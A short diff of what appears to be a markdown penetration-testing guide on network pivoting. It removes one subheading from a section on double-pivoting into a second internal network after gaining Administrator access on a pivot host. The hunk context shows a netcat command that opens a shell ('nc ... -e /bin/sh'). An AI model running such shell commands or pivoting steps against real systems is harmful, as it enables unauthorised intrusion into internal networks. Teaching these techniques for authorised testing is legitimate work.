@@ -125,7 +125,6 @@ nc 172.16.150.10 9002 -e /bin/sh
 ```
 
 ## Easy Double Pivot to Access a Second Internal Network
-### Establishing the Second Pivot
 The following situation is given:
 - We got access to the first internal network (172.16.150.0/24) through Administrator access at Pivot Host A (172.16.150.10).
 - The Host B as access to another internal network (172.16.200.0/24).
